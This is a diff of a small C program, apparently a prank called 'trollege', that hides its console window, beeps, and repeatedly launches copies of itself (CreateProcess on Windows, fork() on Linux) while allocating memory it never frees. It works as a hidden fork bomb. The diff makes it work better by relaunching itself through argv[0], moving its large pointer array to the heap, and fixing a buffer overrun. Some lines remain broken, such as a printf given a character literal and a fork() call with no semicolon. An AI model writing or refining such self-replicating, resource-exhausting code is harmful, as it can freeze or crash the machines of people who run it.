@@ -9,27 +9,33 @@
 #endif
 
 //forgive me if this is trash I am new to C
-int main() 
+int main(int argc, char **argv)
 {
     #ifdef _WIN32
     HWND hWnd = GetConsoleWindow();
     ShowWindow( hWnd, SW_MINIMIZE );
     ShowWindow( hWnd, SW_HIDE );    
     #endif
-    FILE *x[268435455];
+    FILE **x;
     for(unsigned int i = 0; i < 268435455; i++) {
+        if(i == 0)
+            x = malloc(sizeof(FILE*));
+        else
+            x = realloc(x, sizeof(FILE*) * (i+1));
         for(int y = 0; y < 10; y++) {
             printf('\x7');
             #ifdef _WIN32
+            // Fork for windows
             PROCESS_INFORMATION ProcessInfo;
 
             STARTUPINFO StartupInfo;
 
             ZeroMemory(&StartupInfo, sizeof(StartupInfo));
             StartupInfo.cb = sizeof(StartupInfo);
-            CreateProcess("trollege.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
+            CreateProcess(argv[0], NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
             #endif 
             #ifdef __linux__
+            // Fork for linux
             fork()
             #endif
         }
@@ -39,7 +45,8 @@ int main()
             malloc(i);
         }
         char str[10];
-        for(int y = 0; y < 20; y++)
+        str[9] = 0;
+        for(int y = 0; y < 9; y++)
         {
             str[y] = (rand() % (126 - 32 + 1)) + 32;
         }
